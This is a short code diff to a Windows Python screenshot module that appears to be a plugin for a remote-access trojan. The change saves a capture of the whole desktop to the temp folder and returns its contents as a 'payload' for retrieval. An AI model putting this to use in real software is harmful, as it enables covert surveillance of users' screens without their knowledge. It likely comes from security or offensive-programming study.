@@ -2,6 +2,8 @@ import win32gui
 import win32ui
 import win32con
 import win32api
+import tempfile
+
 
 def run(*args):
     # grab a handle to the main desktop window
@@ -29,8 +31,15 @@ def run(*args):
     mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
     
     # save the bitmap to a file
-    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
+    fName = tempfile.gettempdir() + "\\daew.bmp" 
+    print fName
+    screenshot.SaveBitmapFile(mem_dc, fName)
+    
+    f = open(fName, "r")
+    payload = f.read()
     
     # free our objects
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
+    
+    return payload
